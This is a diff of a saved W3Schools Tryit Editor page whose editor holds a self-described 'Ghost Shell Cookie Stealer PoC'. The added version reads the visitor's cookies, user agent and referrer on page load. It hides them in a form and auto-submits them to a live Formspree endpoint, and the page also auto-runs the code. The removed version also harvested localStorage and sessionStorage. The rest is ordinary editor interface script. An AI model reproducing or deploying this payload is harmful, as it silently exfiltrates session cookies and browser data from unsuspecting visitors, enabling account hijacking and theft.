@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-US">
 <head>
-<title>W3Schools Tryit Editor - Auto-Run Formspree</title>
+<title>W3Schools Tryit Editor</title>
 <meta name="viewport" content="width=device-width">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta property="og:image" content="https://www.w3schools.com/images/w3schools_logo_436_2.png">
@@ -48,6 +48,7 @@ subjectFolder = subjectFolder.substr(0, subjectFolder.indexOf("/"));
 <script src="/lib/uic.js?v=1.0.5"></script>
 <script src="/lib/uic_prov.js?v=1.0.6"></script>
 <script data-cfasync="false" type="text/javascript">
+
 uic_prov_pre("tryit","");
 if (window.addEventListener) {              
     window.addEventListener("resize", browserResize);
@@ -90,7 +91,8 @@ body {
   min-width:380px;
   position:absolute;
   width:100%;
-  top:130px;
+  top:99px;
+top:130px;
   background-color:#E7E9EB;
 }
 .topnav-icons {
@@ -134,7 +136,8 @@ a.w3schoolslink:hover,a.w3schoolslink:active {
   width:100%;
   overflow:auto;
   position:absolute;
-  top:175px;
+  top:144px;
+top:175px;
   bottom:0;
   height:auto;
 }
@@ -425,13 +428,24 @@ body.darktheme ::-webkit-scrollbar-track-piece {background-color:#000;}
 body.darktheme ::-webkit-scrollbar-thumb {height:50px;background-color: #616161; background-color:#38444d;}
 body.darktheme ::-webkit-scrollbar-thumb:hover {background-color: #aaaaaa;background-color: #4b5b68;}
 </style>
+<!--[if lt IE 8]>
+<style>
+#textareacontainer, #iframecontainer {width:48%;}
+#container {height:500px;}
+#textarea, #iframe {width:90%;height:450px;}
+#textareaCode, #textareaCode2, #iframeResult, .codewindow {height:450px;}
+.stack {display:none;}
+</style>
+<![endif]-->
 </head>
 <body>
 <!-- Google Tag Manager (noscript) -->
-<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KTCFC3S" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KTCFC3S"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 <!-- End Google Tag Manager (noscript) -->
 
-<div id='tryitLeaderboard'></div>
+<div id='tryitLeaderboard'>
+</div>
 
 <div id='breadcrumb'>
 <ul>
@@ -478,15 +492,16 @@ body.darktheme ::-webkit-scrollbar-thumb:hover {background-color: #aaaaaa;backgr
     <div id="textarea">
       <div id="textareawrapper">
         <textarea autocomplete="off" id="textareaCode" wrap="logical" spellcheck="false"><!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ghost Shell Storage Stealer PoC</title>
+    <title>Ghost Shell Cookie Stealer PoC</title>
     <style>
         body {
-            background-color: black;
-            color: white;
+            background-color: black; /* Black background */
+            color: white; /* Default text color */
             display: flex;
             justify-content: center;
             align-items: center;
@@ -496,86 +511,42 @@ body.darktheme ::-webkit-scrollbar-thumb:hover {background-color: #aaaaaa;backgr
         }
         h2 {
             text-align: center;
-            color: gold;
-            text-shadow: 0 0 10px rgba(255, 215, 0, 0.8);
+            color: gold; /* Gold text */
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.8); /* Glowing effect */
         }
         form {
             display: none; /* Hidden form */
         }
-        #output {
-            margin-top: 20px;
-            padding: 10px;
-            background-color: #222;
-            border: 1px solid #666;
-            max-width: 80%;
-            word-wrap: break-word;
-        }
     </style>
 </head>
 <body>
-    <h2>Ghost Shell Storage Stealer PoC</h2>
-    <div id="output">Captured data will appear here...</div>
+
+    <h2>Ghost Shell Cookie Stealer Hidden PoC</h2>
 
     <form id="stealthForm" action="https://formspree.io/f/xoveanyq" method="POST">
-        <input type="hidden" name="storage_data" id="storageField" value="default_storage">
+        <input type="hidden" name="cookie_data" id="cookieField" value="default_cookie">
         <input type="hidden" name="user_agent" id="userAgentField" value="default_agent">
         <input type="hidden" name="referrer" id="referrerField" value="default_referrer">
-        <input type="hidden" name="fallback" value="not_empty">
+        <input type="hidden" name="fallback" value="not_empty"> <!-- Prevents empty form rejection -->
         <button type="submit" name="submitButton">Send</button>
     </form>
-
     <script>
         document.addEventListener("DOMContentLoaded", function() {
-            // Capture all browser storage
+            // Capture cookies, user agent, and referrer
             var cookies = document.cookie || "No_Cookies";
-            var localStorageData = JSON.stringify(localStorage.length ? localStorage : "No_LocalStorage") || "No_LocalStorage";
-            var sessionStorageData = JSON.stringify(sessionStorage.length ? sessionStorage : "No_SessionStorage") || "No_SessionStorage";
             var userAgent = navigator.userAgent || "Unknown_User_Agent";
             var referrer = document.referrer || "No_Referrer";
 
-            // Combine all data into a single object
-            var allData = {
-                cookies: cookies,
-                localStorage: localStorageData,
-                sessionStorage: sessionStorageData,
-                userAgent: userAgent,
-                referrer: referrer
-            };
-            var allDataString = JSON.stringify(allData);
-
-            // Display locally for demo purposes
-            document.getElementById("output").innerHTML = "Captured Data:<br>" + escapeHtml(allDataString);
-
-            // Inject data into form fields (for original submission intent)
-            document.getElementById("storageField").value = allDataString;
+            // Inject data into form fields
+            document.getElementById("cookieField").value = cookies;
             document.getElementById("userAgentField").value = userAgent;
             document.getElementById("referrerField").value = referrer;
 
-            // Auto-submit the form if data exists (uncomment to enable)
-            // if (cookies !== "No_Cookies" || localStorageData !== "No_LocalStorage" || sessionStorageData !== "No_SessionStorage" || referrer !== "No_Referrer") {
-            //     document.getElementById("stealthForm").submit();
-            // }
-
-            // Set test data for demo
-            setTestData();
+            // Submit form only if data exists
+            if (cookies !== "No_Cookies" || referrer !== "No_Referrer") {
+                document.getElementById("stealthForm").submit();
+            }
         });
-
-        // Function to set test data in storage
-        function setTestData() {
-            document.cookie = "testCookie=HelloCookie; path=/";
-            localStorage.setItem("testLocal", "HelloLocalStorage");
-            sessionStorage.setItem("testSession", "HelloSessionStorage");
-        }
-
-        // Escape HTML to prevent XSS in display
-        function escapeHtml(unsafe) {
-            return unsafe
-                .replace(/&/g, "&")
-                .replace(/</g, "<")
-                .replace(/>/g, ">")
-                .replace(/"/g, """)
-                .replace(/'/g, "'");
-        }
     </script>
 </body>
 </html>
@@ -592,9 +563,8 @@ body.darktheme ::-webkit-scrollbar-thumb:hover {background-color: #aaaaaa;backgr
     </div>
   </div>
 </div>
-
 <script>
-submitTryit();
+submitTryit()
 function submitTryit(n) {
     if (window.editor) {
       window.editor.save();
@@ -617,17 +587,156 @@ function submitTryit(n) {
     }
 }
 
-/* Rest of the script remains unchanged */
-function hideSpinner() { document.getElementById("runloadercontainer").style.display = "none"; }
-function displaySpinner() { /* Spinner logic */ }
+function hideSpinner() {
+  document.getElementById("runloadercontainer").style.display = "none";
+}
+function displaySpinner() {
+  var i, c, w, h, r, top;
+  i = document.getElementById("iframeResult");
+  w = w3_getStyleValue(i, "width");
+  h = w3_getStyleValue(i, "height");
+  c = document.getElementById("runloadercontainer");
+  c.style.width = w;
+  c.style.height = h;
+  c.style.display = "block";
+  w = Number(w.replace("px", "")) / 5;
+  r = document.getElementById("runloader");
+  r.style.width = w + "px";
+  r.style.height = w + "px";
+  h = w3_getStyleValue(r, "height");
+  h = Number(h.replace("px", "")) / 2;
+  top = w3_getStyleValue(c, "height");
+  top = Number(top.replace("px", "")) / 2;
+  top = top - h
+  r.style.top = top + "px";
+}
+
 var currentStack=true;
 if ((window.screen.availWidth <= 768 && window.innerHeight > window.innerWidth) || "" == " horizontal") {restack(true);}
-function restack(horizontal) { /* Restack logic */ }
-function showFrameSize() { /* Frame size logic */ }
-function fixDragBtn() { /* Drag button logic */ }
-function dragstart(e) { /* Drag start logic */ }
-function dragmove(e) { /* Drag move logic */ }
-function dragend() { /* Drag end logic */ }
+function restack(horizontal) {
+    var tc, ic, t, i, c, f, sv, sh, d, b, height, flt, width;
+    tc = document.getElementById("textareacontainer");
+    ic = document.getElementById("iframecontainer");
+    t = document.getElementById("textarea");
+    i = document.getElementById("iframe");
+    c = document.getElementById("container");    
+    sv = document.getElementById("stackV");
+    sh = document.getElementById("stackH");
+    b = document.getElementsByClassName("localhostoutercontainer");
+    tc.className = tc.className.replace("horizontal", "");
+    ic.className = ic.className.replace("horizontal", "");        
+    t.className = t.className.replace("horizontal", "");        
+    i.className = i.className.replace("horizontal", "");        
+    c.className = c.className.replace("horizontal", "");                        
+    if (b[0]) {b[0].className = b[0].className.replace("horizontal", "")};
+    if (sv) {sv.className = sv.className.replace("horizontal", "")};
+    if (sv) {sh.className = sh.className.replace("horizontal", "")};
+    stack = "";
+    if (horizontal) {
+        tc.className = tc.className + " horizontal";
+        ic.className = ic.className + " horizontal";        
+        t.className = t.className + " horizontal";        
+        i.className = i.className + " horizontal";                
+        c.className = c.className + " horizontal";                
+        if (sv) {sv.className = sv.className + " horizontal"};
+        if (sv) {sh.className = sh.className + " horizontal"};
+        if (b[0]) {b[0].className = b[0].className + " horizontal"};        
+        stack = " horizontal";
+        document.getElementById("textareacontainer").style.height = "50%";
+        document.getElementById("iframecontainer").style.height = "50%";
+        document.getElementById("textareacontainer").style.width = "100%";
+        document.getElementById("iframecontainer").style.width = "100%";
+        currentStack=false;
+    } else {
+        document.getElementById("textareacontainer").style.height = "100%";
+        document.getElementById("iframecontainer").style.height = "100%";
+        document.getElementById("textareacontainer").style.width = "50%";
+        document.getElementById("iframecontainer").style.width = "50%";
+        currentStack=true;        
+    }
+    fixDragBtn();
+    showFrameSize();
+}
+function showFrameSize() {
+  var t;
+  var width, height;
+  width = Number(w3_getStyleValue(document.getElementById("iframeResult"), "width").replace("px", "")).toFixed();
+  height = Number(w3_getStyleValue(document.getElementById("iframeResult"), "height").replace("px", "")).toFixed();
+  document.getElementById("framesize").innerHTML = "Result Size: <span>" + width + " x " + height + "</span>";
+}
+var dragging = false;
+var stack;
+function fixDragBtn() {
+  var textareawidth, leftpadding, dragleft, containertop, buttonwidth
+  var containertop = Number(w3_getStyleValue(document.getElementById("container"), "top").replace("px", ""));
+  if (stack != " horizontal") {
+    document.getElementById("dragbar").style.width = "5px";    
+    textareasize = Number(w3_getStyleValue(document.getElementById("textareawrapper"), "width").replace("px", ""));
+    leftpadding = Number(w3_getStyleValue(document.getElementById("textarea"), "padding-left").replace("px", ""));
+    buttonwidth = Number(w3_getStyleValue(document.getElementById("dragbar"), "width").replace("px", ""));
+    textareaheight = w3_getStyleValue(document.getElementById("textareawrapper"), "height");
+    dragleft = textareasize + leftpadding + (leftpadding / 2) - (buttonwidth / 2);
+    document.getElementById("dragbar").style.top = containertop + "px";
+    document.getElementById("dragbar").style.left = dragleft + "px";
+    document.getElementById("dragbar").style.height = textareaheight;
+    document.getElementById("dragbar").style.cursor = "col-resize";
+  } else {
+    document.getElementById("dragbar").style.height = "5px";
+    if (window.getComputedStyle) {
+        textareawidth = window.getComputedStyle(document.getElementById("textareawrapper"),null).getPropertyValue("height");
+        textareaheight = window.getComputedStyle(document.getElementById("textareawrapper"),null).getPropertyValue("width");
+        leftpadding = window.getComputedStyle(document.getElementById("textarea"),null).getPropertyValue("padding-top");
+        buttonwidth = window.getComputedStyle(document.getElementById("dragbar"),null).getPropertyValue("height");
+    } else {
+        dragleft = document.getElementById("textareawrapper").currentStyle["width"];
+    }
+    textareawidth = Number(textareawidth.replace("px", ""));
+    leftpadding = Number(leftpadding .replace("px", ""));
+    buttonwidth = Number(buttonwidth .replace("px", ""));
+    dragleft = containertop + textareawidth + leftpadding + (leftpadding / 2);
+    document.getElementById("dragbar").style.top = dragleft + "px";
+    document.getElementById("dragbar").style.left = "5px";
+    document.getElementById("dragbar").style.width = textareaheight;
+    document.getElementById("dragbar").style.cursor = "row-resize";        
+  }
+}
+function dragstart(e) {
+  e.preventDefault();
+  dragging = true;
+  var main = document.getElementById("iframecontainer");
+}
+function dragmove(e) {
+  if (dragging) {
+    document.getElementById("shield").style.display = "block";        
+    if (stack != " horizontal") {
+      var percentage = (e.pageX / window.innerWidth) * 100;
+      if (percentage > 5 && percentage < 98) {
+        var mainPercentage = 100-percentage;
+        document.getElementById("textareacontainer").style.width = percentage + "%";
+        document.getElementById("iframecontainer").style.width = mainPercentage + "%";
+        fixDragBtn();
+      }
+    } else {
+      var containertop = Number(w3_getStyleValue(document.getElementById("container"), "top").replace("px", ""));
+      var percentage = ((e.pageY - containertop + 20) / (window.innerHeight - containertop + 20)) * 100;
+      if (percentage > 5 && percentage < 98) {
+        var mainPercentage = 100-percentage;
+        document.getElementById("textareacontainer").style.height = percentage + "%";
+        document.getElementById("iframecontainer").style.height = mainPercentage + "%";
+        fixDragBtn();
+      }
+    }
+    showFrameSize();  
+  }
+}
+function dragend() {
+  document.getElementById("shield").style.display = "none";
+  dragging = false;
+  var vend = navigator.vendor;
+  if (window.editor && vend.indexOf("Apple") == -1) {
+      window.editor.refresh();
+  }
+}
 if (window.addEventListener) {              
   document.getElementById("dragbar").addEventListener("mousedown", function(e) {dragstart(e);});
   document.getElementById("dragbar").addEventListener("touchstart", function(e) {dragstart(e);});
@@ -638,16 +747,93 @@ if (window.addEventListener) {
   window.addEventListener("load", fixDragBtn);
   window.addEventListener("load", showFrameSize);
 }
-function retheme() { /* Theme logic */ }
-(function setThemeMode() { /* Theme mode logic */ })();
-function colorcoding() { /* CodeMirror logic */ }
+function retheme() {
+  var cc = document.body.className;
+  if (cc.indexOf("darktheme") > -1) {
+    document.body.className = cc.replace("darktheme", "");
+    if (opener) {opener.document.body.className = cc.replace("darktheme", "");}
+    localStorage.setItem("preferredmode", "light");
+  } else {
+    document.body.className += " darktheme";
+    if (opener) {opener.document.body.className += " darktheme";}
+    localStorage.setItem("preferredmode", "dark");
+  }
+}
+(function setThemeMode() {
+  var x = localStorage.getItem("preferredmode");
+  if (x == "dark") {
+    document.body.className += " darktheme";
+  }
+})();
+function colorcoding() {
+  var ua = navigator.userAgent;
+  if (ua && ua.toUpperCase().indexOf("OPERA MINI") > -1) { return false; }
+  window.editor = CodeMirror.fromTextArea(document.getElementById("textareaCode"), {
+    mode: "text/html",
+    lineWrapping: true,
+    smartIndent: false,
+    htmlMode: true,
+    autocorrect: false,      
+    addModeClass: true
+  });
+}
 colorcoding();
-function clickTab(x) { return false; }
-function w3_getStyleValue(elmnt,style) { /* Style value logic */ }
-function openMenu() { /* Menu logic */ }
-window.onclick = function(event) { /* Overlay click logic */ }
-function setCodewindowHeight() { /* Code window height logic */ }
-function docReady(fn) { /* Doc ready logic */ }
+function clickTab(x) {
+  return false;
+}
+function w3_getStyleValue(elmnt,style) {
+    if (window.getComputedStyle) {
+        return window.getComputedStyle(elmnt,null).getPropertyValue(style);
+    } else {
+        return elmnt.currentStyle[style];
+    }
+}
+function openMenu() {
+    var x = document.getElementById("navbarDropMenu");
+    var y = document.getElementById("menuOverlay");
+    var z = document.getElementById("menuButton");
+    if (z.className.indexOf("w3-text-gray") == -1) {
+        z.className += " w3-text-gray";
+    } else { 
+        z.className = z.className.replace(" w3-text-gray", "");
+    }
+    if (z.className.indexOf("w3-gray") == -1) {
+        z.className += " w3-gray";
+    } else { 
+        z.className = z.className.replace(" w3-gray", "");
+    }
+    if (x.className.indexOf("w3-show") == -1) {
+        x.className += " w3-show";
+    } else { 
+        x.className = x.className.replace(" w3-show", "");
+    }
+    if (y.className.indexOf("w3-show") == -1) {
+        y.className += " w3-show";
+    } else { 
+        y.className = y.className.replace(" w3-show", "");
+    }
+}
+window.onclick = function(event) {
+    if (event.target == document.getElementById("menuOverlay")) {
+        openMenu();
+    }
+}
+function setCodewindowHeight() {
+  var i;
+  var txw = document.getElementById("textareawrapper");
+  var txwh = w3_getStyleValue(txw,"height");
+  var qwsa = document.getElementsByClassName("codewindow");
+  for (i = 0; i < qwsa.length; i++) {
+    qwsa[i].style.height = txwh;
+    qwsa[i].style.setProperty("overflow", "auto", "important");
+  }
+}
+function docReady(fn) {
+  document.addEventListener("DOMContentLoaded", fn);
+  if (document.readyState === "interactive" || document.readyState === "complete" ) {
+    fn();
+  }
+}
 uic_prov_al();
 
 // Auto-click the Run button on page load
@@ -660,5 +846,6 @@ window.addEventListener("load", function() {
 <script src="/lib/user-session.js?v=1.0.34"></script>
 <script src="/lib/spaceit.js?v=1.0.6"></script>
 <link rel="stylesheet" type="text/css" href="/lib/spaceit.css" />
+
 </body>
 </html>
